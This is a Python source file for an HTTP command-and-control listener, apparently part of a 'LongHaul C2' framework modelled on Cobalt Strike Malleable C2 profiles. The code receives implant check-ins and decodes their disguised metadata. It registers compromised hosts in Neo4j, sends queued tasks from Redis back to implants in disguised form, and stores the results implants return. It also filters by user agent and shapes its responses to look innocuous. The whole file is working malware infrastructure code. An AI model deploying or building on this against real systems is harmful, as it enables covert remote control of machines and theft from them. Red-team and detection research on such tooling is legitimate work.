"""
HTTP Malleable C2 Listener

An HTTP Listener, which is defined by a Malleable C2 Profile.


Note on return types, keeping it simple. These are the only http status
codes used.

200: OK, continue with whatever
204: No content, things worked but nothign for you
400/404: requester fucked something up, go away/try again later
500: something went wrong

https://pypi.org/project/pyMalleableProfileParser/0.3/
"""

import re

import msgpack

# NEW: Structlog imports
import structlog
import uvicorn
from fastapi import FastAPI, HTTPException, Request, Response, status
from mpp import MalleableProfile
from starlette.middleware.base import BaseHTTPMiddleware

# from ...modules.mysql_functions import ImplantService
from ...db.neo4j_functions import Neo4jImplantNodeService
from ...db.redis_functions import RedisImplantTaskService
from ...utils.checks import check_type
from ..malc2 import (
    HttpConfigBlockServerParser,
    HttpGetBlockClientParser,
    HttpGetBlockServerParser,
    HttpPostBlockClientParser,
    HttpPostBlockServerParser,
    load_malleable_profile,
)

app = FastAPI
mp = MalleableProfile
g_listener_uuid: str

listener_logger = structlog.get_logger("listener")
NULL_UUID = "00000000-0000-0000-0000-000000000000"


# entrypoint
def run(
    listener_uuid: str,
    listener_port: int,
    listener_host: str,
    listener_profile_contents: str,
):
    """The entrypoint for the listener

    Args:
        listener_uuid (str): UUID of the listener that is being spawned
    """
    # make mp global to this module so we don't have to  read from it/pass everywhere constantly
    global mp, app, g_listener_uuid

    check_type(listener_uuid, str, "listener_uuid")
    check_type(listener_port, int, "listener_port")
    check_type(listener_host, str, "listener_host")
    check_type(listener_profile_contents, str, "listener_profile")

    g_listener_uuid = listener_uuid

    """
    Quick explanation, mp takes a file, not a string (it has a from_string method... but it wasn't working)
    So, tempfile on the host, then pass that into the mp parser. Whatever, it works well enough.

    Tried StringIO, didn't work either
    """
    # with tempfile.NamedTemporaryFile("w+", suffix=".profile") as tmp_file:
    #     tmp_file.write(listener_profile_contents)
    #     tmp_file.flush()
    #     mp = MalleableProfile(profile=tmp_file.name)
    #     # clean profile
    #     clean_ast_backslash_delimiters(mp.profile)

    # # structlog: Bind global context for this listener process
    # structlog.contextvars.bind_contextvars(listener_uuid=listener_uuid)
    # listener_logger.info("listener_startup", profile=str(mp.profile))

    mp = load_malleable_profile(listener_profile_contents)

    # to shutoff docs
    # app = FastAPI(
    #     docs_url=None,
    #     redoc_url=None,
    #     openapi_url=None,
    # )

    app = FastAPI(
        title="LongHaul C2 HTTP Listener",
        description="Malleable C2 defined Listener endpoints",
        version="0.0.0",
    )

    # header handling
    app.add_middleware(HeadersMiddleware)
    app.add_middleware(DumpRequestMiddleware)

    # print(mp.http_get)

    # pull out verbs, tldr, this is the safest way to do it
    try:
        get_verb = mp.http_get.verb.value or "GET"
    except Exception:
        get_verb = "GET"

    try:
        post_verb = mp.http_post.verb.value or "POST"
    except Exception:
        post_verb = "POST"

    # add catchall route
    app.add_api_route(
        path="/{full_path:path}",
        endpoint=http_catchall,  # logic for endpoint here
        methods=[get_verb, post_verb],
        # response_model=dict,
        # tags=["items"],
    )

    # reload needs to be OFF.
    # server_header=false disabled  "server uvicorn" in the response
    uvicorn.run(app, host=listener_host, port=listener_port, reload=False, server_header=False)


###################################
# Various Handlers
###################################


def check_if_data(data_from_request):  #
    """
    Check if somehting (the request, a value you extracted, etc) had data (evaluates falsey-ness). If not, return a 400.

    data_from_request: The data that was in the request, and needs to not be empty/missing.

    Here so I don't repeat this line 58145148754 times for each case/switch
    """
    if not data_from_request:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            # intentially vague to not give away what field the data is in
            detail="Missing required data",
        )


def check_user_agent(user_agent: str) -> bool:
    """
    Checks user agent. If allowed (via profile), returns True
    else, False.

    Calling function should return a 404 on a check fail

    https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_http-server-config.htm#_Toc65482845
    """
    check_type(user_agent, str, "user_agent")

    try:
        mp.http_config  # noqa B018 - intensionally checks if http_config is there or not
        # listener_logger.debug("http-config block not found")
        # return False
    except Exception as e:
        listener_logger.debug("config_block_error", error=str(e))
        listener_logger.debug("http-config block not found")
        # no block set, so every user agent is okay
        return True

    hcbsp = HttpConfigBlockServerParser(mp.http_config)

    # Get the blocked and allowed user agents from the configuration
    blocked_useragents = hcbsp.get_blocked_user_agents()
    allowed_useragents = hcbsp.get_allowed_user_agents()

    # listener_logger.debug("Blocked user agents:", blocked_useragents)
    # listener_logger.debug("Allowed user agents:", allowed_useragents)

    # First, check for blocked user agents
    if blocked_useragents:
        for pattern in blocked_useragents:
            # Convert the pattern to a regular expression
            regex = pattern.replace("*", ".*")  # Convert * to .*

            # Check if the user-agent matches the pattern
            if re.match(regex, user_agent):
                listener_logger.debug("user_agent_blocked", pattern=pattern, ua=user_agent)
                return False  # Blocked agent

    # If blocked_useragents passed, we don't need to check allowed_useragents
    # But if allowed_useragents are specified and blocked didn't block, we check allow
    if allowed_useragents:
        for pattern in allowed_useragents:
            # Convert the pattern to a regular expression
            regex = pattern.replace("*", ".*")  # Convert * to .*

            # Check if the user-agent matches the pattern
            if re.match(regex, user_agent):
                listener_logger.debug("user_agent_allowed", pattern=pattern, ua=user_agent)
                return True  # Allowed agent

    # Default return if no matches were found
    # listener_logger.debug("User-agent not allowed (no matching patterns found)")
    return True  # Default to allow through if not in blocked, and there's nothign in


# getting a 400 somehow:
#'NoneType' object has no attribute 'data'
async def deobsfucate_malleable_c2_request_data(
    request: Request,
    terminator_type,
    # coudl just require the parser class instead of adding both
    malleable_c2_block,
    parser_class,
    block_field,  # field to apply to,  ex, id, output, etc. mp.http_post.client.id otherwise parser doesn't know
    malleable_c2_method_block,
    terminator_key=None,
) -> bytes:
    """
    Extracts data from the HTTP request based on the specified terminator type.

    request: the fastAPI request
    terminator_type: Type of terminator
    malleable_c2_block: the mc2 block, ex, metadata, or id, or output (sorry, confusing)
    parser_class: What class the malleable c2 is parsed with
    block_field,  field to apply to, ex, id, output, etc. mp.http_post.client.id otherwise parser doesn't know
    malleable_c2_method_block: The parent method block, ex mc2.http_get (sorry, confusing)
    terminator_key=None, (optional) the key value that is the terminator, if applicable.
        Used in headers/params to locate data

    """
    match terminator_type:
        case "header":
            # listener_logger.debug(request.headers)
            normalized_headers = {k.lower(): v for k, v in request.headers.items()}
            data_from_request = normalized_headers.get(terminator_key.lower())

            listener_logger.debug("extracting_header", key=terminator_key)
            # listener_logger.debug(f"Data from request: {data_from_request}")
            check_if_data(data_from_request)

            try:
                hce = parser_class(malleable_c2_block)
                data = hce.apply_transforms(data=data_from_request, block_field=block_field)
                listener_logger.debug("deobfuscation_complete", type="header", len=len(data))
                return data
            except Exception as e:
                listener_logger.error("deobfuscation_failed", error=str(e), type="header")
                raise e

        case "parameter":
            data_from_request = request.query_params.get(terminator_key)
            # listener_logger.debug(f"Data from request: {data_from_request}")

            check_if_data(data_from_request)

            # convert to bytes, as URL is in string
            data_from_request_bytes = data_from_request.encode()

            try:
                hce = parser_class(malleable_c2_block)
                data = hce.apply_transforms(data=data_from_request_bytes, block_field=block_field)
                listener_logger.debug("deobfuscation_complete", type="parameter", len=len(data))
                return data
            except Exception as e:
                listener_logger.error("deobfuscation_failed", error=str(e), type="parameter")
                raise e
        case "print":
            # in body, so just get body
            data_from_request = await request.body()

            check_if_data(data_from_request)

            try:
                hce = parser_class(client_block=malleable_c2_block)
                data = hce.apply_transforms(data=data_from_request, block_field=block_field)
                listener_logger.debug("deobfuscation_complete", type="print", len=len(data))
                return data
            except Exception as e:
                listener_logger.error("deobfuscation_failed", error=str(e), type="print")
                raise e

        # for some reason
        case "uri-append":
            # get URI
            # url = URL(str(request.url))
            # data_from_request = url.path.rstrip("/").split("/")[-1]

            path = request.url.path
            # new method: strip out URI, then take what's LEFT, and pass into transforms.
            # Otherwise, something where there's a path after (ex, /data/b, will take b, instead of data)
            base_uri = malleable_c2_method_block.uri.value
            data_from_request = path.replace(base_uri, "")
            data_in_uri_bytes = data_from_request.encode()

            # Strip the leading slash (and ensure it handles bytes)
            # if isinstance(data_from_request, bytes):
            #     data_from_request = data_from_request.lstrip(b"/")
            # else:
            #     data_from_request = data_from_request.lstrip("/")

            # return uri_append.encode()
            try:
                hce = parser_class(client_block=malleable_c2_block)
                data = hce.apply_transforms(data=data_in_uri_bytes, block_field=block_field)
                listener_logger.debug("deobfuscation_complete", type="print", len=len(data))
                return data
            except Exception as e:
                listener_logger.error("deobfuscation_failed", error=str(e), type="print")
                raise e

        case _:
            # unknown terminator
            listener_logger.error("unknown_terminator", terminator=terminator_type)
            # throw error cuz we can't continue if we don't have the task
            raise ValueError


###################################
# Various Middleware
###################################
class HeadersMiddleware(BaseHTTPMiddleware):
    """
    Add/removes headers to each request.

    Pulls which headers to add/remove based on malleable c2 profiles
    """

    async def dispatch(self, request, call_next):
        # Call the next request handler
        response = await call_next(request)

        # err checkincase mp.http_config doesn't exist.
        try:
            mp.http_config  # noqa B018 - intentionally checks if http_config is there or not
        except Exception as e:
            listener_logger.debug("http_config_not_found", error=str(e))
            # pass all processing, just return response
            return response

        hcbsp = HttpConfigBlockServerParser(mp.http_config)

        headers_to_add = hcbsp.get_headers_to_add_to_request()
        # get all added headers
        for header, value in headers_to_add.items():
            # del existing headers first (so you don't endup with 2 of the same)
            # RFC 7230 (Section 3.2.2) (for HTTP/1.1) states that:
            # A sender SHOULD NOT generate duplicate header fields, and a recipient SHOULD ignore duplicate header
            # fields unless otherwise indicated."
            if header in response.headers:
                """
                Ignore header if it already exists.
                """
                continue

            # then add
            # listener_logger.debug(f"Adding header: {header}: {value}")
            response.headers[header] = value

            # could just replace too instead of deleting.

        # After constructing, reorder the headers according to the desired order
        ordered_headers = hcbsp.reorder_headers(response.headers)
        """
            oh my fuck this is kind of cursed. Had to go into the response calss
            definition, and find a method that reset the headers.
            hopefully this doesn't break in the future, but for now,
            init_headers takes a dict of headers, which overwrites the old ones.

            Headers work and are in order now

            Note: Date seems to show up first every time for some reason.
        """
        response.init_headers(headers=ordered_headers)
        # listener_logger.debug(response.headers)

        return response


class DumpRequestMiddleware(BaseHTTPMiddleware):
    """
    Dumps request from each request

    """

    async def dispatch(self, request, call_next):
        # Call the next request handler

        # body = await request.body()

        # print("=== REQUEST DUMP ===")
        # print("METHOD:", request.method)
        # print("URL:", request.url)
        # print("HEADERS:", dict(request.headers))
        # print("QUERY:", dict(request.query_params))
        # print("BODY:", body.decode(errors="ignore"))

        return await call_next(request)


###################################
# HTTP GET
###################################
"""
HTTP POST with CS is where task data is retrieved from the server.

"""


# this could be moved out of this listener func into somehwere else for geenic usage
def _register_new_implant(unpacked_metadata: dict, request: Request):
    """
    Handles the creation of a new implant.

    """
    global g_listener_uuid
    listener_logger.info("New implant connected")

    # extract external id from the req that came in.
    unpacked_metadata["external_ip"] = request.client.host

    implant_uuid = unpacked_metadata.get("implant_uuid")
    if not implant_uuid:
        listener_logger.warning("New implant came in without a UUID", unpacked_metadata=unpacked_metadata)
        return

    # also, create in neo4j
    implant_node = Neo4jImplantNodeService(
        # listener uuidis passed in weird here, it's set as a global
        # if this func is moved out, just have it be passed in via args
        implant_uuid=implant_uuid,
        listener_uuid=g_listener_uuid,
    )
    # pass ALL metadata to host
    implant_node.register_node(**unpacked_metadata)


async def http_get(request: Request) -> Response:
    """
    HTTP GET endpoint for the HTTP listener.
    """
    # STRUCTLOG: Clean context and bind Request info
    structlog.contextvars.clear_contextvars()
    structlog.contextvars.bind_contextvars(method="GET", ip=request.client.host, path=request.url.path)

    # security checks
    user_agent = request.headers.get("user-agent")
    listener_logger.debug("incoming_request", ua=user_agent)

    # 404 on fail. Can't sinkhole without extra setup/steps atm.
    if not check_user_agent(user_agent):
        listener_logger.warning("request_blocked_ua")
        return Response(status_code=404)

    """
    Handle inputted data form fastapi

    """
    hce = HttpGetBlockClientParser(client_block=mp.http_get.client)
    try:
        metadata_terminator_type, metadata_terminator_key = hce.get_metadata_terminator()
        data_from_implant = await deobsfucate_malleable_c2_request_data(
            request=request,
            terminator_type=metadata_terminator_type,
            terminator_key=metadata_terminator_key,
            malleable_c2_block=mp.http_get.client,
            block_field=mp.http_get.client.metadata,  # use metadata field to extract
            parser_class=HttpGetBlockClientParser,
            malleable_c2_method_block=mp.http_get,
        )
        listener_logger.debug("payload_extracted", len=len(data_from_implant))
    except Exception as e:
        listener_logger.error("get_processing_error", error=str(e))
        raise HTTPException(status_code=400, detail="Invalid or malformed client data") from e

    # add implant to sql

    return http_response(data_from_implant=data_from_implant, request=request)


def http_response(data_from_implant: bytes, request: Request):
    """
    Setup a response for the implant.
    """
    task_list = []

    # take extracted data, shove into class:
    try:
        implant_get_request_array = msgpack.unpackb(data_from_implant)

        # sanity check data form
        # ImplantUpdate(**unpacked_metadata)
        # md = Metadata(unpacked_metadata)
        # md.validate()  # , if err return 400 malformed

    except Exception as e:
        listener_logger.error("metadata_validation_failed", error=str(e))
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Malformed data",
        ) from e

    # get's come in as an array now, loop over them
    for implant_get_request in implant_get_request_array:
        # grab UUID out of current task
        implant_uuid = implant_get_request.get("implant_uuid", "")
        listener_logger.info("Extracted metadata in metadata list on GET", metadata=implant_get_request)
        # check_if_data(implant_uuid)
        if not implant_uuid:
            listener_logger.warning(
                "Task came in without an implant_uuid, discarding", implant_get_request=implant_get_request
            )
            continue

        # if implant_uuid not in neo4j, go ahead and register
        implant_data_in_db = Neo4jImplantNodeService.get_by_uuid(implant_uuid)

        # new implant!
        # this is bugged. Link command creates a ghost node in neo4j, and hten this fails
        # when the implant actually sends in its checkin, cuz it exists in neo4j
        # if not implant_not_in_database:
        #     _register_new_implant(unpacked_metadata=implant_get_request, request=request)

        # Register if the node doesn't exist OR if it's a bare placeholder.
        # We check for a common piece of metadata to determine if it's just a shell.
        # Using system_hostname as that check.
        if not implant_data_in_db or not implant_data_in_db.get("system_hostname"):
            listener_logger.info("Registering new implant or populating placeholder", implant_uuid=implant_uuid)
            _register_new_implant(unpacked_metadata=implant_get_request, request=request)

    # now, find the egress node of one of the implant UUID's (doesn't matter which
    # the function pathfinds for us)
    one_of_the_uuids_from_checkin = implant_get_request_array[0].get("implant_uuid")
    egress_uuid = Neo4jImplantNodeService.get_egress_of_node(one_of_the_uuids_from_checkin)

    # get the list of all children attached to egress
    children = Neo4jImplantNodeService.get_children_for_parent(parent_uuid=egress_uuid)

    # get tasks for all children
    for child in children:
        child_uuid = child.get("implant_uuid", "")

        listener_logger.info("Extracted child data", child_data=child)

        if not child_uuid:
            listener_logger.warning("Child missing implant uuid")
            continue

        # grab next task for the implant, if any
        its = RedisImplantTaskService(child_uuid)
        msgpack_task = its.dequeue_task()

        # make sure there is actually a task here, if not, jump to next item
        if not msgpack_task:
            listener_logger.debug("No task for implant, continuing")
            continue

        # queue up for response
        task_for_implant = msgpack.unpackb(msgpack_task)
        task_list.append(task_for_implant)

    # and of course make sure the parent gets tasks for itself
    its = RedisImplantTaskService(implant_uuid=egress_uuid)
    msgpack_task = its.dequeue_task()
    if msgpack_task:
        # queue up for response
        task_for_implant = msgpack.unpackb(msgpack_task)
        task_list.append(task_for_implant)

    # Catch the empty queue BEFORE unpacking so we don't 500
    if not task_list:
        listener_logger.info("checkin_no_task")
        raise HTTPException(status_code=204)

    listener_logger.info("final task list", task_list=task_list)
    # convert task list back to msgpack
    msgpack_task_list = msgpack.packb(task_list)

    # structlog.contextvars.bind_contextvars(implant_id=implant_uuid)

    if not msgpack_task_list:
        listener_logger.info("checkin_no_task")
        raise HTTPException(
            status_code=204  # 204 for no content, but the request suceeded.
        )

    listener_logger.info("checkin_task_queued")

    # pass in block to respective class
    # get the stuff we need from it
    emitter = HttpGetBlockServerParser(mp.http_get.server)
    headers = emitter.headers()
    obsfucated_task = emitter.generate_data(msgpack_task_list)

    terminator_type, terimnator_key = emitter.get_output_terminator()

    match terminator_type:
        # note, only print is a valid output statemetn (from https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_profile-language.htm#_Toc65482837)
        # The print statement is the expected termination statement for the http-get.server.output,
        # http- post.server.output, and http-stager.server.output blocks.
        # You may use the header, parameter, print and uri-append termination statements for the other blocks.

        case "print":
            # send data in the body
            body = obsfucated_task
            # and construct the response
            return Response(content=body, headers=headers)

        case _:
            # unknown terminator
            listener_logger.error("unknown_server_terminator", terminator=terminator_type)
            # note still sent headers to make it somewhat less suspicous
            return Response(status_code=500, headers=headers)


###################################
# HTTP POST
###################################
"""
HTTP POST with CS is where task response data is sent back to

"""


async def http_post(request: Request) -> Response:
    """
    HTTP POST endpoint for the HTTP listener.
    """
    # STRUCTLOG: Clean context and bind Request info
    structlog.contextvars.clear_contextvars()
    structlog.contextvars.bind_contextvars(method="POST", ip=request.client.host, path=request.url.path)

    user_agent = request.headers.get("user-agent")
    listener_logger.debug("incoming_request", ua=user_agent)

    # 404 on fail. Can't sinkhole without extra setup/steps atm.
    if not check_user_agent(user_agent):
        listener_logger.warning("request_blocked_ua")
        return Response(status_code=404)
    """
    Handle inputted data form fastapi.

    On failure,return a 400 for bad data

    """
    hce = HttpPostBlockClientParser(client_block=mp.http_post.client)
    # extract terminator data
    # for some reason, http-post uses output, not metadata

    try:
        # BUG: output key not being retrieved for some reason
        output_terminator_type, output_terminator_key = hce.get_output_terminator()

        # check if keys, ifnot, throw a 400 (it's a server error though - so maybe change later)
        check_if_data(output_terminator_type)
        # check_if_data(output_terminator_key) # if print, no key, so no check

        data_from_implant = await deobsfucate_malleable_c2_request_data(
            request=request,
            terminator_type=output_terminator_type,
            terminator_key=output_terminator_key,
            malleable_c2_block=mp.http_post.client,
            block_field=mp.http_post.client.output,
            parser_class=HttpPostBlockClientParser,
            malleable_c2_method_block=mp.http_post,
        )
        listener_logger.debug("post_output_extracted", len=len(data_from_implant))
    except Exception as e:
        listener_logger.error("post_output_error", error=str(e))
        raise HTTPException(status_code=400, detail="Invalid or malformed client data") from e

    try:
        # note, id is always in a header or param
        # https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_beacon-http-transaction-walkthru.htm#_Toc65482844
        id_terminator_type, id_terminator_key = hce.get_id_terminator()

        # check if keys
        check_if_data(id_terminator_type)
        # check_if_data(id_terminator_key) # may not always be a key, ex print

        implant_uuid_bytes = await deobsfucate_malleable_c2_request_data(
            request=request,
            terminator_type=id_terminator_type,
            terminator_key=id_terminator_key,
            malleable_c2_block=mp.http_post.client,
            block_field=mp.http_post.client.id,
            parser_class=HttpPostBlockClientParser,
            malleable_c2_method_block=mp.http_post,
        )

        # can be fixed by decoding the data in teh appy_transform functions in each class,
        # that way, on fallthrough, no conversion here is needed.

        # implantuuid, can be either bytes, or str. Str, if no transforms, bytes, if transform. Probaly should fix that.
        if isinstance(implant_uuid_bytes, bytes):
            implant_uuid_str = implant_uuid_bytes.decode("latin-1")

        else:
            # if for wahtever reason, it's not bytes (which shouldn't happen..., but does on no transform profiles)
            implant_uuid_str = implant_uuid_bytes

        # note, implant_uuid is now bytes. Need to convert to a string before passing in to redis

        # STRUCTLOG: Bind ID
        structlog.contextvars.bind_contextvars(implant_id=implant_uuid_str)
        listener_logger.info("implant_id_extracted")

    except Exception as e:
        listener_logger.error("post_id_error", error=str(e))
        raise HTTPException(status_code=400, detail="Invalid or malformed client data") from e

    # here, crappy inline, but decode messagepack task.
    # for each task in the response list, we need to store in redis

    """
    task_response_dict = data_from_implant.msgpack decode

    for task in task_response_dict:
        # shitty, inneficient, re-encode to msgpack for redis
        #
        rits = RedisImplantTaskService(implant_uuid)
        rits.enqueue_response(data_from_implant)

    """
    # ! Hacky modification to allow a msgpack array of tasks coming back from the implant.
    # ! de-serialize, for iteration purposes. Re-serialize, as that's what redis wants/the whole response cache
    # ! system is built on
    task_response_list: list[dict] = msgpack.unpackb(data_from_implant)
    listener_logger.info("Received tasks from implant", tasks=task_response_list)
    for unpacked_task_response in task_response_list:
        # _ to differentiate from previous implant_uuid variable.
        _implant_uuid = unpacked_task_response.get("implant_uuid", "")
        _task_uuid = unpacked_task_response.get("task_uuid", "")

        if not _implant_uuid:
            listener_logger.warning(
                "Task came back without an implant_uuid", implant_uuid=_implant_uuid, task=unpacked_task_response
            )
            continue

        packed_response = msgpack.packb(unpacked_task_response)

        rits = RedisImplantTaskService(_implant_uuid)
        rits.enqueue_response(packed_response)
        listener_logger.info("task response stored in redis", implant_uuid=_implant_uuid, task_uuid=_task_uuid)

    # Generate a response for the implant according to Malleable c2 & send back
    return http_post_response()


def http_post_response():
    """
    Setup a response for the implant

    """
    # pass in block to respective class
    emitter = HttpPostBlockServerParser(mp.http_post.server)

    # get the stuff we need from it
    headers = emitter.headers()

    # spin up redis class, write deobsfucated data to redis.
    # this will get picked up by the redis batch watchdog and write to mysql
    # rits = RedisImplantTaskService(implant_uuid)
    # rits.enqueue_response(data_from_implant)

    terminator_type, target = emitter.get_output_terminator()

    # adjust to listener_logger.debug
    # also, find out what data the server sends back on a post.
    # it's somhwere in those malleable c2 docs with the flow of a req.
    # looks to be emptyy.

    """
    Request     Component   Block       Data
    http-get    client      metadata    Session metadata
    http-get    server      output      Beacon’s tasks
    http-post   client      id          Session ID
    http-post   client      output      Beacon’s responses
    http-post   server      output      Empty
    http-stager server      output      Encoded payload stage
    """

    match terminator_type:
        # case "header":
        #     # send data in a header
        #     # headers[target] = data
        #     # construct response here

        case "print":
            # server post sends none after a task result is sent in.
            # 200 back, no content (make sure it's not null...)
            return Response(status_code=200, content=None, headers=headers)

        case _:
            # unknown terminator
            listener_logger.error("unknown_server_terminator", terminator=terminator_type)
            # note still sent headers to make it somewhat less suspicous
            return Response(status_code=500, headers=headers)


###################################
# Route setup
###################################

# Potential solution to chaos of multi routes/fastapi, use "one" route:

# (have one for get, one for post). Pass of to some logic func, that does what it needs to with the
# request object. This makes it way easier to jsut get all the URI data, and have simplified logic for this.

# from fastapi import FastAPI, Request

# uri's here, load from profile
# C2_GET_URI = ["/wiki", "/news", "/submit"]
# C2_POST_URI = ["/wiki", "/news", "/submit"]


# Capture EVERYTHING (The "Jetty" method)
async def http_catchall(request: Request, full_path: str):  # noqa ARG001 - Potentially unused, haven't tested
    # Important: The path might come in without the leading slash from the param
    actual_path = request.url.path

    # note, this technically uri could be a list. Could randomly choose from that list, but i think it's
    # more geared towards letting the implant choose from the list instead...

    # pull out the needed uri's
    http_get_uri = mp.http_get.uri.value
    http_post_uri = mp.http_post.uri.value

    # pull out verbs, tldr, this is the safest way to do it
    try:
        http_get_method = mp.http_get.verb.value or "GET"
    except Exception:
        http_get_method = "GET"

    try:
        http_post_method = mp.http_post.verb.value or "POST"
    except Exception:
        http_post_method = "POST"

    # path check both GET and POST to make sure we are only letting through correct implant traffic
    # Also - use tuple() because .startswith() accepts a tuple of strings for multiple matches
    # listener_logger.debug(
    #     "CHECKING_TUPLE", tuple_contents=tuple(http_get_uri), actual_path=actual_path
    # )
    if actual_path.startswith(http_get_uri) and request.method == http_get_method:
        listener_logger.debug("http_get_matched", path=actual_path, uri=http_get_uri)
        return await http_get(request=request)

    if actual_path.startswith(http_post_uri) and request.method == http_post_method:
        listener_logger.debug("http_post_matched", path=actual_path, uri=http_get_uri)

        return await http_post(request=request)

    listener_logger.debug("URI did not match any configured endpoints", path=actual_path, method=request.method)
    return {"error": "Not Found"}, 404
